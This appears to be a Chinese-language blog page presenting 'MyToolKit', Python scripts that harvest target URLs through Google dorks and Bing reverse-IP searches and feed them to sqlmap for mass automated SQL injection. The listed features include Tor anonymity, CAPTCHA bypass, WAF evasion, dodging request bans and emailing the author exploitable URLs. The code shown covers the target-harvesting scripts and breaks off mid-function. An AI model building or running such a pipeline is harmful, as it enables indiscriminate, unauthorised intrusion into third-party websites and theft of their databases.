<!DOCTYPE html>
<html>


    <head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
<title>MyToolKit</title>
<meta name="description" content="A blog about programming and network security">

<link rel="profile" href="https://gmpg.org/xfn/11" />
<link rel="stylesheet" href="/css/my_code.css">
<!-- below font-awesome.css can not be replaced by local file,error will occur -->
<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">

<link href="https://fonts.googleapis.com/css?family=Great+Vibes" rel="stylesheet">

<link rel="stylesheet" type="text/css" media="all" href="/css/style.css" />
<link rel="stylesheet" type="text/css" media="all" href="/css/jquery.mmenu.all.css" />
<link rel="stylesheet" href="/css/highlightjs.piperita.css">

<!-- Favicons generated at https://realfavicongenerator.net/ -->
<link rel="apple-touch-icon" sizes="57x57" href="/favicons/apple-touch-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/favicons/apple-touch-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/favicons/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/favicons/apple-touch-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/favicons/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/favicons/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/favicons/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/favicons/apple-touch-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon-180x180.png">
<link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/favicons/android-chrome-192x192.png" sizes="192x192">
<link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96">
<link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
<link rel="manifest" href="/favicons/manifest.json">
<link rel="shortcut icon" href="/favicons/favicon.ico">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-TileImage" content="/favicons/mstile-144x144.png">
<meta name="msapplication-config" content="/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">

<!-- 下面这句是添加在线中文字体:文泉驿等宽正黑 -->
<!-- <script type="text/javascript" src="//cdn.webfont.youziku.com/wwwroot/js/wf/youziku.api.min.js"></script> -->







<!-- add zoom.js --> 
<link href="/css/zoom.css" rel="stylesheet">
<script src="/js/jquery-1.11.0.min.js"></script>
<script src="/js/zoom.js"></script>
<script src="/js/transition.js"></script>

</head>


    <body>

    <nav id="my-menu">
  <div>
    <p style="font-family: 'Great Vibes', cursive;">quanyechavshuo</p>


    
    <center style="margin-top:180%">
    <br>
    <br>
    <font color="red" align="center"><i class="fa fa-music" aria-hidden="true"></i><a href="../../../../../jquery-jplayer/index.html" target="_top"><font color="red"> music</font></a></font>
    <br>
    <br>
    </center>
    <p class="links">
  <a href="https://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
  <a href="https://github.com/3xp10it" target="_new"><i class="fa fa-github-alt"></i></a>
  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
</p>

  </div>
</nav>
<div class="menu-button" href="#menu"><i class="fa fa-bars"></i></div>



    <div class="page-content">
      <div class="wrap">
      

<div class="container-fluid single">
  <div class="row">

    <div itemscope itemtype="https://schema.org/Article" class="col-md-12 article">
      

      <h1 class="header" itemprop="name">MyToolKit</h1>

      <div class="author">
        <small><i>
          
          on <span itemprop="datePublished" content="2014-08-28">April 15, 2016</span>
           under python
        </i></small>
      </div>

      <div class="read-time">
        <small>
          57 minute read
        </small>
      </div>

      <div class="content-panel content">

        

        <span itemprop="articleBody"><h2 id="1本工具包括6个模块">1.本工具包括6个模块:</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  easy_search.py,
  my_bing_domains_v1_alone.py,
  my_GoogleScraper_bing_domain.py,
  mysqlmap.py,
  MyToolKit.py,
  mail.py
</code></pre></div></div>

<h2 id="2各模块介绍">2.各模块介绍:</h2>

<h3 id="1easy_searchpy">1&gt;easy_search.py:</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>google关键字搜索相关网页结果,并对结果通过sqlmap注入,类似啊D里的搜索注入功能,但比啊D里强大,因为这里用sqlmap检测注入并注入,其中google搜索的功能采用完全模仿浏览器方式,可得到所有通过浏览器Google搜索的结果,通过GoogleScraper模块实现,其中GoogleScraper利用 Selenium模块模拟 浏览器人工访问功能.
</code></pre></div></div>

<h3 id="2my_bing_domains_v1_alonepy">2&gt;my_bing_domains_v1_alone.py:</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>通过bing的api接口原理实现,需要注册bing的api_key,每个月免费5000次.
</code></pre></div></div>

<h3 id="3my_googlescraper_bing_domainpy">3&gt;my_GoogleScraper_bing_domain.py:</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>通过GoogleScraper的浏览器模拟人工访问bing,关键字ip:111.111.111.111,获取所有
结果,当只有一页结果 时,GoogleScraper不能得到该查询结果,调用上面的my_bing_dom
ains_v1_alone.py模块继续查询.
</code></pre></div></div>

<h3 id="4mysqlmappy">4&gt;mysqlmap.py:</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap自动化sqli模块,详情见代码.
</code></pre></div></div>

<h3 id="5mytoolkitpy">5&gt;MyToolKit.py:</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>综合入口模块,选择不同需求,实现不同功能.共包括8个功能,分别为:
--exp:
  批量使用exp功能 
--mygoogle 
  --sqlmap-crawl:
    使用my_GoogleScraper_bing_domain.py模块和sqlmap的crawl功能实现批量自动化
    自动化sqli
  --sqlmap-g-nohuman:
    使用my_GoogleScraper_bing_domain.py模块和sqlmap的-g选项功能实现批量自动化
    sqli.
  --sqlmap-g-human:
    使用my_GoogleScraper_bing_domain.py模块和可绕过验证码的GoogleScraper,人工,,输入验证码,获取所有url,用sqlmap的
    -m选项功能实现批量自动化sqli.
--mybing
  --sqlmap-crawl:
    使用my_bing_domains_v1_alone.py模块和sqlmap的crawl功能实现批量自动化sqli.
  --sqlmap-g-nohuman:
    使用my_bing_domains_v1_alone.py模块和sqlmap的-g选项功能实现批量自动化sqli
  --sqlmap-g-human:
    使用my_bing_domains_v1_alone.py模块 和可绕过验证码的 GoogleScraper,人工输入验证码,获取所有url,用sqlmap的-m选项
    功能实现批量自动化sqli.
--easy_search:
  相当于--mygoogle下的--sqlmap-g-human功能的子功能,但灵活性更强,可任意关键字google搜索并利用sqlmap注入. 最常用功能
  应该是--mygoogle下的--sqlmap-g-human及--easy_search这两个.
</code></pre></div></div>

<h3 id="6mailpy">6&gt;mail.py:</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>自动发送邮件,内嵌在MytoolKit.py中.
</code></pre></div></div>

<h2 id="3环境要求">3.环境要求:</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>安装GoogleScraper(python3下),并修改部分GoogleScraper中第三方模块selenium中代码(绕过验证码)可参考以前一篇写的关于google search api for python的文章90sec
链接:https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=9024 百度网盘链接
https://pan.baidu.com/s/1kUklzZD 密码: 4cpn
</code></pre></div></div>

<h3 id="2016126部分代码更新">2016.1.26部分代码更新</h3>

<h3 id="2016128部分代码更新">2016.1.28部分代码更新</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.添加tor匿名功能,可自由选择tor或不用tor
</code></pre></div></div>

<h3 id="2016128部分代码更新增加功能">2016.1.28部分代码更新,增加功能:</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.绕过"多次错误访问后屏蔽所有请求"
2.请求延时
3.尝试绕过waf
4.支持post注入
</code></pre></div></div>

<h3 id="2016129部分代码更新增加功能">2016.1.29部分代码更新,增加功能:</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.定位旁站的sqli所在主站
2.发送邮件通知功能,将可用sqli的url发送邮件通知(smtp用163)
</code></pre></div></div>

<h3 id="201632部分代码更新">2016.3.2部分代码更新:</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.easy_search.py line:116 添加自动结束冗余firefox进程功能 
2.修改mysqlmap.py中line:131-161的逻辑错误 
3.修改其它py中fp=open()以后没有fp.close()的错误 
4.修改MyToolKit.py中对easy_search.py调用的逻辑错误 
5.关键字由php|asp变成php|asp|aspx|jsp 
6.修改my_bing_domains_v1_alone.py中get_the_one_targe_domains函数使用遇到不工
  作的域名解析异常使全局出错的错误 line:21-22
7.自动处理output目录移动,使得运行前不必清空output目录
8.修改my_bing_domains_v1_alone.py中get_the_one_targe_domains函数
</code></pre></div></div>

<h2 id="4相应代码">4.相应代码:</h2>

<p>1&gt;easy_search.py</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#need py3 coz GoogleScraper need py3 with selenium module changed to make it possible
#to supass yanzhengma
#easy_search.py is stronger than combineGoogleScraper_myurlhandle.py
#coz the latter can get the https_url only while easy_search.py can get 
#the three kinds of url_list and txt
#
#
##/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
#
#function:
#this script get the GoogleScraper_origin_https_domain_url_list.txt 
#that is a file with urls which can be directly thrown into sqlmap to start
#dig sqli(s),and the urls are from google search,eg.
#when you run easy_search.py,you need supply keyword for google search,
#then the result is those urls from this google search,the result file is 
#GoogleScraper_origin_https_domain_url_list.txt. 
#need py3 coz GoogleScraper need py3 with selenium module changed to make it possible
#to supass yanzhengma
#easy_search.py is stronger than combineGoogleScraper_myurlhandle.py
#coz the latter can get the https_url only while easy_search.py can get
#the three kinds of url_list and txt
#
#
##/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
#
#function:
#this script get the GoogleScraper_origin_https_domain_url_list.txt
#that is a file with urls which can be directly thrown into sqlmap to start
#dig sqli(s),and the urls are from google search,eg.
#when you run easy_search.py,you need supply keyword for google search,
#then the result is those urls from this google search,the result file is
#GoogleScraper_origin_https_domain_url_list.txt.
</span><span class="kn">import</span> <span class="n">sys</span>
<span class="k">def</span> <span class="nf">save_url_to_file</span><span class="p">(</span><span class="n">url_list</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
    <span class="nb">file</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="sh">"</span><span class="s">a+</span><span class="sh">"</span><span class="p">)</span>
    <span class="nb">file</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">ur</span> <span class="ow">in</span> <span class="n">url_list</span><span class="p">:</span>
        <span class="nb">file</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">all_lines</span><span class="o">=</span><span class="nb">file</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">all_lines</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">all_lines</span><span class="p">))</span>
        <span class="nb">file</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

        <span class="c1">#if ur+"\r\n" not in all_lines:
</span>        <span class="k">if</span> <span class="n">ur</span><span class="o">+</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">all_lines</span><span class="p">:</span>
            <span class="c1">#print(type(ur))
</span>            <span class="c1">#print(type("\r\n"))
</span>            <span class="c1">#print(type(ur+"\r\n"))
</span>            <span class="nb">file</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="sh">"</span><span class="s">a+</span><span class="sh">"</span><span class="p">)</span>
            <span class="c1">#print 11112212
</span>            <span class="nf">print</span><span class="p">(</span><span class="n">ur</span><span class="p">)</span>
            <span class="nb">file</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">ur</span><span class="o">+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
            <span class="nb">file</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
            <span class="nb">file</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>




<span class="k">def</span> <span class="nf">myGoogleScraper_get_urls_from_query</span><span class="p">(</span><span class="n">query</span><span class="p">,</span><span class="n">want</span><span class="p">):</span>
	<span class="n">keyword</span><span class="o">=</span><span class="n">query</span>
	<span class="n">num_page</span><span class="o">=</span><span class="mi">50</span>
	<span class="n">method</span><span class="o">=</span><span class="sh">'</span><span class="s">selenium</span><span class="sh">'</span>
	<span class="n">browser</span><span class="o">=</span><span class="sh">'</span><span class="s">firefox</span><span class="sh">'</span>
	<span class="kn">from</span> <span class="n">GoogleScraper</span> <span class="kn">import</span> <span class="n">scrape_with_config</span><span class="p">,</span> <span class="n">GoogleSearchError</span>

	<span class="c1"># See in the config.cfg file for possible values
</span>	<span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
	    <span class="sh">'</span><span class="s">use_own_ip</span><span class="sh">'</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span>
	    <span class="sh">'</span><span class="s">keyword</span><span class="sh">'</span><span class="p">:</span> <span class="n">keyword</span><span class="p">,</span>
	    <span class="sh">'</span><span class="s">search_engines</span><span class="sh">'</span><span class="p">:</span> <span class="p">[</span><span class="sh">'</span><span class="s">google</span><span class="sh">'</span><span class="p">],</span><span class="c1">#google,yahoo,baidu,bing...is ok,see GoogleScraper source.
</span>	    <span class="sh">'</span><span class="s">num_pages_for_keyword</span><span class="sh">'</span><span class="p">:</span> <span class="n">num_page</span><span class="p">,</span>
	    <span class="sh">'</span><span class="s">scrape_method</span><span class="sh">'</span><span class="p">:</span> <span class="n">method</span><span class="p">,</span>
	    <span class="sh">'</span><span class="s">sel_browser</span><span class="sh">'</span><span class="p">:</span> <span class="n">browser</span><span class="p">,</span>
	    <span class="sh">'</span><span class="s">do_caching</span><span class="sh">'</span><span class="p">:</span> <span class="bp">False</span>
	<span class="p">}</span>

	<span class="k">try</span><span class="p">:</span>
	    <span class="n">search</span> <span class="o">=</span> <span class="nf">scrape_with_config</span><span class="p">(</span><span class="n">config</span><span class="p">)</span>
	    <span class="c1">#print(11)
</span>	<span class="k">except</span> <span class="n">GoogleSearchError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
	    <span class="nf">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>

	<span class="c1"># let's inspect what we got
</span>	<span class="sh">'''</span><span class="s">
	for serp in search.serps:
	    print(serp)
	    print(serp.search_engine_name)
	    print(serp.scrape_method)
	    print(serp.page_number)
	    print(serp.requested_at)
	    print(serp.num_results)

	    # ... more attributes ...

	    for link in serp.links:
	        #link=link.split(</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="s">)[]
	        #print(type(link))
	        print(link.link)
	        all_urls.append(link.link)
	</span><span class="sh">'''</span>
	<span class="n">GoogleScraper_domain_list</span><span class="o">=</span><span class="p">[]</span>
	<span class="n">GoogleScraper_https_domain_list</span><span class="o">=</span><span class="p">[]</span>
	<span class="n">GoogleScraper_origin_https_domain_url_list</span><span class="o">=</span><span class="p">[]</span>
	<span class="n">all_three_list</span><span class="o">=</span><span class="p">[]</span>

	<span class="k">for</span> <span class="n">serp</span> <span class="ow">in</span> <span class="n">search</span><span class="p">.</span><span class="n">serps</span><span class="p">:</span>
		<span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">serp</span><span class="p">.</span><span class="n">links</span><span class="p">:</span>
			<span class="k">if</span> <span class="sh">"</span><span class="s">https://</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">link</span><span class="p">.</span><span class="n">link</span><span class="p">:</span>
			    <span class="n">domain</span><span class="o">=</span><span class="p">(</span><span class="n">link</span><span class="p">.</span><span class="n">link</span><span class="p">)[</span><span class="mi">8</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
			    <span class="c1">#print("domain=(link.link)[8:-1].split('/')[0] is:")
</span>			    <span class="c1">#print(domain)
</span>			    <span class="k">if</span> <span class="n">domain</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">GoogleScraper_domain_list</span><span class="p">:</span>
			    	<span class="n">GoogleScraper_domain_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
			    	<span class="n">GoogleScraper_https_domain_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="sh">"</span><span class="s">https://</span><span class="sh">"</span><span class="o">+</span><span class="n">domain</span><span class="p">)</span>
			    <span class="c1">#attention!here is not the same from the bing_search_domin script,
</span>			    <span class="c1">#coz we need as much url as possible for sqlmap to try to exploit,
</span>			    <span class="c1">#so the origin_https_domain_url_list here will add all of the result,
</span>			    <span class="c1">#though the domain is the same,different url is needed.
</span>			    <span class="n">GoogleScraper_origin_https_domain_url_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">link</span><span class="p">.</span><span class="n">link</span><span class="p">)</span>
			<span class="k">else</span><span class="p">:</span>
			    <span class="n">domain</span><span class="o">=</span><span class="p">(</span><span class="n">link</span><span class="p">.</span><span class="n">link</span><span class="p">)[</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
			    <span class="c1">#print("domain=(link.link)[7:-1].split('/')[0] is:")
</span>			    <span class="c1">#print(domain)
</span>			    <span class="k">if</span> <span class="n">domain</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">GoogleScraper_domain_list</span><span class="p">:</span>
			        <span class="n">GoogleScraper_domain_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
			        <span class="n">GoogleScraper_https_domain_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="sh">"</span><span class="s">https://</span><span class="sh">"</span><span class="o">+</span><span class="n">domain</span><span class="p">)</span>
			    <span class="c1">#attention!here is not the same from the bing_search_domin script,
</span>			    <span class="c1">#coz we need as much url as possible for sqlmap to try to exploit,
</span>			    <span class="c1">#so the origin_https_domain_url_list here will add all of the result,
</span>			    <span class="c1">#though the domain is the same,different url is needed.
</span>			    <span class="n">GoogleScraper_origin_https_domain_url_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">link</span><span class="p">.</span><span class="n">link</span><span class="p">)</span>

	<span class="nf">save_url_to_file</span><span class="p">(</span><span class="n">GoogleScraper_domain_list</span><span class="p">,</span><span class="sh">"</span><span class="s">GoogleScraper_domain_list.txt</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">save_url_to_file</span><span class="p">(</span><span class="n">GoogleScraper_https_domain_list</span><span class="p">,</span><span class="sh">"</span><span class="s">GoogleScraper_https_domain_list.txt</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">save_url_to_file</span><span class="p">(</span><span class="n">GoogleScraper_origin_https_domain_url_list</span><span class="p">,</span><span class="sh">"</span><span class="s">GoogleScraper_origin_https_domain_url_list.txt</span><span class="sh">"</span><span class="p">)</span>
	<span class="n">all_three_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">GoogleScraper_domain_list</span><span class="p">)</span>
	<span class="n">all_three_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">GoogleScraper_https_domain_list</span><span class="p">)</span>
	<span class="n">all_three_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">GoogleScraper_origin_https_domain_url_list</span><span class="p">)</span>

	<span class="kn">import</span> <span class="n">os</span>
	<span class="c1">#although os.system("pkill firefox") maybe ok,
</span>	<span class="c1">#this is a good chance to learn awk&amp;xargs,meanwhile,
</span>	<span class="c1">#os.system("pkill firefox") is not ok here,but below is ok enough
</span>	<span class="c1">#to kill all firefox when it lost into stuck.
</span>	<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'''</span><span class="s">ps -aux | grep firefox | awk </span><span class="sh">'</span><span class="s">{print $2}</span><span class="sh">'</span><span class="s"> | xargs kill -9</span><span class="sh">'''</span><span class="p">)</span>
	<span class="c1">#os.system("pkill firefox")
</span>
	<span class="k">if</span> <span class="n">want</span><span class="o">==</span><span class="sh">'</span><span class="s">GoogleScraper_domain_list.txt</span><span class="sh">'</span><span class="p">:</span>
		<span class="k">return</span> <span class="n">all_three_list</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
	<span class="k">elif</span> <span class="n">want</span><span class="o">==</span><span class="sh">'</span><span class="s">GoogleScraper_https_domain_list</span><span class="sh">'</span><span class="p">:</span>
		<span class="k">return</span> <span class="n">all_three_list</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
	<span class="k">elif</span> <span class="n">want</span><span class="o">==</span><span class="sh">'</span><span class="s">GoogleScraper_origin_https_domain_url_list</span><span class="sh">'</span><span class="p">:</span>
		<span class="k">return</span> <span class="n">all_three_list</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="n">all_three_list</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">usage</span><span class="p">():</span>
	<span class="nf">print</span><span class="p">(</span><span class="sh">'''</span><span class="s">input your keyword directly after the script,
		example:%s site:www.xxx.ooo inurl:php?id=</span><span class="sh">'''</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
	<span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
	<span class="c1">#print("sys.argv[1] is type:%s" % type(sys.argv[1]))
</span>	<span class="n">para_num</span><span class="o">=</span><span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
	<span class="n">keyword</span><span class="o">=</span><span class="sh">""</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">para_num</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
		<span class="n">keyword</span><span class="o">=</span><span class="n">keyword</span><span class="o">+</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
		<span class="k">if</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="o">&lt;</span><span class="n">para_num</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span>
			<span class="n">keyword</span><span class="o">+=</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span>
	<span class="c1">#print keyword
</span>
	<span class="nf">myGoogleScraper_get_urls_from_query</span><span class="p">(</span><span class="n">keyword</span><span class="p">,</span><span class="n">want</span><span class="o">=</span><span class="sh">'</span><span class="s">GoogleScraper_origin_https_domain_url_list</span><span class="sh">'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
	<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
		<span class="nf">usage</span><span class="p">()</span>
	<span class="nf">main</span><span class="p">()</span>








</code></pre></div></div>

<p>2&gt;my_bing_domains_v1_alone.py</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># -*- coding: utf-8 -*-
#need python2(my system is py2.7 by default)
#
#
##/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
</span>
<span class="kn">import</span> <span class="n">urllib</span>
<span class="kn">import</span> <span class="n">urllib2</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">socket</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>    
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">!=</span><span class="mi">2</span><span class="p">:</span>
        <span class="nf">usage</span><span class="p">()</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    
    <span class="k">try</span><span class="p">:</span>
        <span class="nb">file</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">target_list</span><span class="o">=</span><span class="nb">file</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
        <span class="nb">file</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="n">true_target_list</span><span class="o">=</span><span class="p">[]</span>
        <span class="n">true_target_list</span><span class="o">=</span><span class="nf">get_pure_list</span><span class="p">(</span><span class="n">target_list</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">true_target_list</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="nf">get_the_one_target_domains</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="k">print</span> <span class="sh">"</span><span class="s">getip or socket.gethostbyname_ex wrong,the site may break down,you can check it.</span><span class="sh">"</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">sharedHost</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
        <span class="nf">get_the_one_target_domains</span><span class="p">(</span><span class="n">sharedHost</span><span class="p">)</span>
        <span class="k">print</span> <span class="sh">"</span><span class="s">open file wrong coz this input is not a file but a domain or when you do put a file,then the script open file wrong</span><span class="sh">"</span>
    
        

    
    
    
<span class="k">def</span> <span class="nf">get_the_one_target_domains</span><span class="p">(</span><span class="n">sharedHost</span><span class="p">):</span>
    <span class="n">domain_list</span><span class="o">=</span><span class="p">[]</span>
    <span class="n">https_domain_list</span><span class="o">=</span><span class="p">[]</span>
    <span class="n">origin_https_domain_url_list</span><span class="o">=</span><span class="p">[]</span>
    <span class="n">ip</span><span class="o">=</span><span class="nf">getIp</span><span class="p">(</span><span class="n">sharedHost</span><span class="p">)</span>
    <span class="n">all_nics_ip</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">gethostbyname_ex</span><span class="p">(</span><span class="n">sharedHost</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
    <span class="c1">#whether sharedHost is hostname or ip appereance,
</span>    <span class="c1">#getIP function is ok to get "ip" appereance like x.x.x.x 
</span>    <span class="n">query</span> <span class="o">=</span> <span class="sh">"</span><span class="s">ip:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">ip</span>

    <span class="c1">#print "query is %s" % query
</span>

    
    <span class="k">for</span> <span class="n">piece</span> <span class="ow">in</span> <span class="nf">bing_search</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="sh">'</span><span class="s">Web</span><span class="sh">'</span><span class="p">):</span>
        <span class="k">if</span> <span class="sh">"</span><span class="s">https://</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">piece</span><span class="p">[</span><span class="sh">'</span><span class="s">Url</span><span class="sh">'</span><span class="p">]:</span>
            
            <span class="n">domain</span><span class="o">=</span><span class="n">piece</span><span class="p">[</span><span class="sh">'</span><span class="s">Url</span><span class="sh">'</span><span class="p">][</span><span class="mi">8</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
            <span class="c1">#print '11111111111111111111111111111111111111:'+domain+'333333:'+getIp(domain)
</span>            <span class="c1">#if domain not in domain_list:# and getIp(domain)==ip
</span>            <span class="k">if</span> <span class="n">domain</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">domain_list</span> <span class="ow">and</span> <span class="nf">getIp</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span> <span class="ow">in</span> <span class="n">all_nics_ip</span><span class="p">:</span>
                <span class="n">domain_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>     
                <span class="n">https_domain_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="sh">"</span><span class="s">https://</span><span class="sh">"</span><span class="o">+</span><span class="n">domain</span><span class="p">)</span>
